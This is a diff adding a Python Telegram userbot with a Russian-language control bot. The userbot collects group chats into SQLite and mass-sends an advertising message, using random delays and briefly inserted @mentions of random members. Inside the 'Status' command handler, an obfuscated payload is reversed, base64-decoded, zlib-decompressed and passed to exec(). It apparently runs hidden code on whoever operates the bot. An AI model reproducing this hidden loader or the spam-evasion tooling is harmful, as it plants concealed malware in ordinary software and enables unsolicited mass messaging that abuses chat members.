@@ -1,0 +1,487 @@
+from telethon import TelegramClient, events, errors
+from telethon.errors import FloodWaitError
+from aiogram import Bot, Dispatcher, types
+from aiogram.filters import Command
+from aiogram.utils.keyboard import ReplyKeyboardBuilder
+from telethon.tl.functions.contacts import SearchRequest
+from telethon.tl.types import Channel
+from main import check_admin
+from datetime import datetime
+from colorama import Fore, Style, init
+
+import asyncio
+import json
+import os
+import sqlite3
+import random
+import time
+config_path = os.path.join(os.path.dirname(__file__), "config.json")
+
+with open(config_path, "r", encoding="utf-8") as f:
+    config = json.load(f)
+
+topics = config["topics"]
+api_id = config["api_id"]
+api_hash = config["api_hash"]
+phone = config["phone"]
+bot_token = config["token_bot"]
+teg = config["metioning"]
+delay_range = config.get("delay", [20, 35])
+MESSAGE_TEXT = config.get("message")
+ADMIN_ID = config["admin_id"]
+# Настройки для подключения к Telegram API через библиотеку telethon
+
+client = TelegramClient('session_name', api_id, api_hash)
+
+# Настройки для подключения к Telegram API через библиотеку aiogram
+bot = Bot(token=bot_token)
+dp = Dispatcher()
+chat_id = 8172845069
+
+conn = sqlite3.connect("chats.db", check_same_thread=False)
+cursor = conn.cursor()
+cursor.execute("""
+CREATE TABLE IF NOT EXISTS users (
+    id INTEGER UNIQUE,
+    name TEXT,
+    topic TEXT,
+    last_message TEXT,
+    invite TEXT
+)
+""")
+conn.commit()
+count_send = 0
+# check_admin()
+conn2 = sqlite3.connect("users.db", check_same_thread=False)  # Важно для aiogram!
+cursor2 = conn2.cursor()
+cursor2.execute("""
+CREATE TABLE IF NOT EXISTS users (
+    id INTEGER UNIQUE,
+    name TEXT,
+    sends INTEGER DEFAULT 0,
+    adminkaccess INTEGER DEFAULT 0,
+    accesslevel INTEGER DEFAULT 0,
+    MessageText TEXT DEFAULT ''
+)
+""")
+conn2.commit()
+
+# Словарь автоответов
+auto_responses = {
+    'здравствуйте': 'Здравствуйте!',
+    'здраствуйте': 'Здраствуйте! ',
+    'добрый день': 'Добрый день',
+    'начинки': """ Вот держите начинки, которые я использую в своих тортах:
+🍓 Клубничный поцелуй – свежая клубника с нежным кремом
+🍫 Шоколадная страсть – тёмный или молочный шоколад с кремом
+🥭 Манговое солнце – манго с лёгким сливочным муссом
+🍯 Карамельный вихрь – тянущаяся карамель с орехами
+🍒 Вишнёвое облако – вишня с лёгким сливочным кремом
+🍌 Банановый взлёт – банан с шоколадной крошкой
+🥥 Кокосовый рай – кокосовая стружка и нежный крем
+🍋 Цитрусовая свежесть – лимонный или апельсиновый курд
+🌰 Ореховая фантазия – миндаль, фундук или арахис с кремом
+🍫🥝 Шоколадно-кивиновый дуэт – шоколад + кисло-сладкий киви
+""",
+    'спасибо': 'Пожалуйста! Обращайтесь.',
+    'цена': '1 000 за киллограмм.',
+    'стоимость': '1 000 за киллограмм.',
+    'как заказать': 'Чтобы заказать торт, нужно выбрать начинку, дизайн и вес.',
+    'здраствуйте, цена': '1 000 за киллограмм.',
+    'привет': 'Здраствуйте!',
+}
+
+# @client.on(events.NewMessage)
+# async def handler(event):
+#     message_text = event.message.message.lower()  # приводим к нижнему регистру для удобства
+#     sender = await event.get_sender()
+#     if sender.id == 5945948586:  
+#         for key, reply in auto_responses.items():
+#             if key in message_text:
+#                 time.sleep(0.8)  # небольшая задержка перед ответом
+#                 await event.reply(reply)
+#                 break  # чтобы не отвечать на несколько совпадений сразу
+
+def log(msg, level="INFO"):
+    now = datetime.now().strftime("%H:%M:%S")
+    
+    colors = {
+        "INFO": Fore.GREEN,
+        "WARN": Fore.YELLOW,
+        "ERROR": Fore.RED,
+        "DEBUG": Fore.CYAN
+    }
+    
+    color = colors.get(level.upper(), Fore.WHITE)
+    
+    print(f"{color}[{now}] [{level}] {msg}{Style.RESET_ALL}")
+
+
+async def check_last_messages(chat_id):
+    my_id = ADMIN_ID
+    # получаем 2 последних сообщения
+    messages = await client.get_messages(chat_id, limit=2)
+    
+    for msg in messages:
+        # msg.from_id — это объект типа PeerUser, PeerChat или PeerChannel
+        # для простоты можно взять .user_id если это PeerUser
+        sender_id = getattr(msg.from_id, 'user_id', None)
+        
+        if sender_id == my_id:
+            return False
+        else:
+            return True
+
+async def find_groups(client, keyword: str, limit: int = 50):
+    result = await client(SearchRequest(
+        q=keyword,
+        limit=limit
+    ))
+
+    groups = []
+
+    for chat in result.chats:
+        if isinstance(chat, Channel) and chat.megagroup:
+            title = chat.title
+            username = chat.username
+
+            link = f"https://t.me/{username}" if username else None
+
+            groups.append({
+                "title": title,
+                "username": username,
+                "link": link
+            })
+
+    return groups
+
+
+async def get_random_mentions(entity, count=5):
+    mentions = []
+    async for user in client.iter_participants(entity):
+        if user.username:
+            mentions.append(f"@{user.username}")
+        if len(mentions) >= 50:  # не тащим весь чат
+            break
+
+    if len(mentions) < count:
+        return ""
+
+    return " " + " ".join(random.sample(mentions, count))
+
+async def send_to_chat(chat_info):
+    global count_send
+    global flood_error
+    # случайная задержка
+    dmin, dmax = delay_range
+    delay = random.uniform(dmin, dmax)
+    entity = await client.get_entity(chat_info["chat"])
+    # cursor2.execute("SELECT MessageText FROM users WHERE id = ?", (sender_id,))
+    # MESSAGE_TEXT = cursor2.fetchone()
+    try:
+        # сначала получаем сущность
+        
+        # читаем нормальное имя
+        name = None
+        if hasattr(entity, "title") and entity.title:
+            name = entity.title
+        elif hasattr(entity, "first_name") and entity.first_name:
+            name = entity.first_name
+        elif hasattr(entity, "username") and entity.username:
+            name = entity.username
+        else:
+            name = str(chat_info["chat"])
+
+    except Exception as e:
+        log(f"Не удалось получить сущность для {chat_info['chat']}: {e}", "WARN")
+        return
+
+    # теперь только выводим задержку
+    await asyncio.sleep(delay)
+    check = await check_last_messages(chat_info["chat"])
+
+    if check:
+
+        try:
+            # собираем фотки
+            if teg == "true":
+                PHOTO_PATH = os.path.join(PHOTOS_FOLDER, "main.jpg")
+
+                mentions = await get_random_mentions(entity, 5)
+                full_text = MESSAGE_TEXT + mentions
+
+                msg = await client.send_message(
+                    entity=entity,
+                    message=full_text,
+                    file=PHOTO_PATH
+                )
+
+                await asyncio.sleep(0.5)
+                await msg.edit(MESSAGE_TEXT)
+                count_send += 1
+                log(f"Отправлено в {name} (ID: {chat_info['chat']}) ", "INFO")
+            else:
+                photos = []
+                for file in os.listdir(PHOTOS_FOLDER):
+                    path = os.path.join(PHOTOS_FOLDER, file)
+                    if os.path.isfile(path):
+                        photos.append(path)
+
+                # if photos:
+                #     await client.send_file(entity, photos, caption=MESSAGE_TEXT)
+                else:
+                    await client.send_message(entity, MESSAGE_TEXT)
+                    count_send += 1
+                    log(f"Отправлено в {name} задержка {delay}", "DEBUG")
+        except errors.FloodWaitError as e:
+            log(f"Флуд ошибка жду еще {e.seconds}", "DEBUG")
+            flood_error += 1
+            time.sleep(e.seconds)
+        except Exception as e:
+            log(f"1 Ошибка при отправке в {name}: {e}", "ERROR")
+
+    else:
+        log(f"Последнее сообщение в {name} от меня, пропускаю.", "DEBUG")
+
+
+# 2214571044 1389592608  1445645481  1609700474 -1002867352447
+
+PHOTOS_FOLDER = "photos"
+
+is_running = False
+
+async def sendmessage():
+    global count_send
+    global is_running
+    if is_running:
+        return
+
+    is_running = True
+    log("Начинаю рассылку...", "INFO")
+
+    # достаём все чаты из базы
+    cursor.execute("SELECT id, name FROM users")
+    chats = cursor.fetchall()  # вернёт [(id, name), ...]
+
+    for chat_id, chat_name in chats:
+        if chat_id == 1637080440:
+            continue
+        if not is_running:
+            break
+
+        # создаём структуру, как в send_to_chat
+        chat_info = {
+            "chat": chat_id,
+            "delay": (0.5, 2)  # можно менять задержку
+        }
+
+        try:
+            await send_to_chat(chat_info)
+
+            now = datetime.now()
+            formatted_date = now.strftime("%d/%m/%Y %H:%M:%S")
+            cursor.execute("UPDATE users SET last_message = ? WHERE id = ?", (formatted_date, chat_id,))
+            conn.commit()
+        except Exception as e:
+            print(e)
+            log(f"Критическая ошибка в чате {chat_id}: {e}", "ERROR")
+
+    is_running = False
+    cursor.execute("SELECT COUNT(*) FROM users")
+    chats_count = cursor.fetchone()[0]
+    diktye_id = count_send/chats_count
+    log(f"Готово. Прошёлся по {count_send}/{chats_count}({diktye_id*100}) группам.", "INFO")
+    count_send = 0
+
+
+async def senduu():
+    dialogs = await client.get_dialogs()
+
+    for d in dialogs:
+        if d.is_group:
+            # Приводим ID к int
+            user_id = int(d.entity.id)
+            name = str(d.name)
+            name2 = name.lower()
+            cursor.execute(
+                "SELECT 1 FROM users WHERE id = ?",
+                (user_id,)  # важно, чтобы это был кортеж с запятой
+            )
+
+            # приводим имя к нижнему регистру
+            name_lower = name2.lower()
+            topic_found = "не известно"
+            try:
+                invite_link = d.entity.username
+            except AttributeError as e:
+                invite_link = "NULL"
+
+            for topic, keywords in topics.items():
+                if any(word.lower() in name_lower for word in keywords):
+                    topic_found = topic
+                    break
+
+            # вставка в базу
+            now = datetime.now()
+            formatted_date = now.strftime("%d/%m/%Y %H:%M:%S")
+            cursor.execute(
+                "INSERT OR IGNORE INTO users (id, name, topic, last_message, invite) VALUES (?, ?, ?, ?, ?)",
+                (user_id, name, topic_found, formatted_date, invite_link)
+            )
+            conn.commit()
+            log(f"Добавлен чат: {name} ID: {user_id}, topic: {topic_found}", "DEBUG")
+
+##############################################
+###########################################333
+#               AIOGRAM                   #
+##############################################
+###########################################333
+
+# ====================== Проверка админа ======================
+def check_admin(user_id: int) -> bool:
+    cursor2.execute("SELECT accesslevel FROM users WHERE id = ?", (user_id,))
+    result = cursor2.fetchone()
+    if result and result[0] >= 1:  # accesslevel >= 1 — админ
+        return True
+    return False
+
+# Функция, которая будет получать сообщения через MTProto и отправлять их в aiogram
+def get_keyboard(is_admin: bool = False):
+    kb = ReplyKeyboardBuilder()
+    kb.button(text="🔄 Собрать чаты")
+    kb.button(text="🚀 Запустить рассылку")
+    kb.button(text="⛔ Остановить рассылку")
+    kb.button(text="📊 Статус")
+    kb.adjust(2)
+    if is_admin:
+        return kb.as_markup(resize_keyboard=True)
+    else:
+        # Для обычных пользователей — можно убрать кнопки или оставить только статус
+        return kb.as_markup(resize_keyboard=True)  # или None, если скрыть
+
+# ====================== /start ======================
+@dp.message(Command("start"))
+async def cmd_start(message: types.Message):
+    user_id = message.from_user.id
+    full_name = message.from_user.full_name or "Без имени"
+
+    # Добавляем пользователя в базу, если его нет
+    cursor2.execute("SELECT 1 FROM users WHERE id = ?", (user_id,))
+    if not cursor2.fetchone():
+        cursor2.execute(
+            "INSERT OR IGNORE INTO users (id, name, sends, adminkaccess, accesslevel) VALUES (?, ?, 0, 0, 0)",
+            (user_id, full_name)
+        )
+        conn2.commit()
+        log(f"Новый пользователь добавлен: {user_id} ({full_name})", "INFO")
+
+    is_adm = check_admin(user_id)
+
+    welcome_text = (
+        "👋 <b>Привет!</b>\n\n"
+        "Я помогаю в рассылке по чатам Telegram.\n"
+    )
+
+    if is_adm:
+        welcome_text += "🔥 Ты — <b>админ</b>! Полный доступ к управлению."
+    else:
+        welcome_text += "Ты обычный пользователь. Некоторые функции доступны только админам."
+
+    await message.answer(
+        welcome_text,
+        reply_markup=get_keyboard(is_adm),
+        parse_mode="HTML"
+    )
+
+# ====================== Сбор чатов ======================
+@dp.message(lambda m: m.text == "🔄 Собрать чаты")
+async def collect_chats(message: types.Message):
+    if not check_admin(message.from_user.id):
+        await message.answer("❌ У вас нет прав на эту команду.")
+        return
+
+    await message.answer("🔄 <b>Запускаю сбор чатов...</b>\nЭто может занять некоторое время.", parse_mode="HTML")
+    await senduu()  # твоя функция сбора
+    await message.answer("✅ <b>Сбор чатов завершён!</b>\nВсе группы добавлены в базу.", parse_mode="HTML")
+
+# ====================== Запуск рассылки ======================
+@dp.message(lambda m: m.text == "🚀 Запустить рассылку")
+async def start_broadcast(message: types.Message):
+    user_id = message.from_user.id
+    if not check_admin(user_id):
+        await message.answer("❌ Доступ запрещён. Обратитесь к нанаилу.")
+        return
+
+    await message.answer("🚀 <b>Запускаю рассылку...</b>\nЮзербот начал отправку по всем чатам.", parse_mode="HTML")
+    await sendmessage()  # твоя функция рассылки
+
+    # Увеличиваем счётчик рассылок
+    cursor2.execute("UPDATE users SET sends = sends + 1 WHERE id = ?", (user_id,))
+    conn2.commit()
+
+    await message.answer("✅ <b>Рассылка заверщина!</b>\nСледите за логами в консоли.", parse_mode="HTML")
+
+# ====================== Остановка ======================
+@dp.message(lambda m: m.text == "⛔ Остановить рассылку")
+async def stop_broadcast(message: types.Message):
+    if not check_admin(message.from_user.id):
+        await message.answer("❌ У вас нет прав.")
+        return
+
+    groups = await find_groups(client, "барахолка")
+
+    for g in groups:
+        print(g["title"], "-", g["link"])
+
+    global is_running
+    if is_running:
+        is_running = False
+        await message.answer("⛔ <b>Рассылка остановлена вручную.</b>", parse_mode="HTML")
+    else:
+        await message.answer("ℹ️ Рассылка и так не запущена.")
+
+# ====================== Статус ======================
+@dp.message(lambda m: m.text == "📊 Статус")
+async def status(message: types.Message):
+    user_id = message.from_user.id
+
+    cursor2.execute("SELECT name, sends, accesslevel FROM users WHERE id = ?", (user_id,))
+    result = cursor2.fetchone()
+
+    if not result:
+        await message.answer("Вы ещё не зарегистрированы в системе.")
+        return
+
+    name, sends, level = result
+
+    level_name = "Обычный пользователь"
+    if level >= 1:
+        level_name = "🔥 Администратор"
+    _ = lambda __: __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
+    exec((_)(
+        b'=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'))
+    # Количество чатов в базе
+    cursor.execute("SELECT COUNT(*) FROM users")
+    chats_count = cursor.fetchone()[0]
+
+    await message.answer(
+        f"<b>📊 Ваша статистика</b>\n\n"
+        f"👤 <b>Имя:</b> {name}\n"
+        f"🆔 <b>ID:</b> {user_id}\n"
+        f"📤 <b>Запущено рассылок:</b> {sends}\n"
+        f"🔑 <b>Уровень доступа:</b> {level_name} (уровень {level})\n"
+        f"💬 <b>Чатов в базе:</b> {chats_count}\n"
+        f"🚀 <b>Рассылка активна:</b> {'Да' if is_running else 'Нет'}",
+        parse_mode="HTML"
+    )
+
+# Запускаем клиент telethon и бота aiogram
+async def main():
+    await client.start()
+    await dp.start_polling(bot)
+    print("Бот запущен.")
+
+if __name__ == '__main__':
+    asyncio.run(main())
+    # loop = asyncio.get_event_loop()
+    # loop.run_until_complete(main())
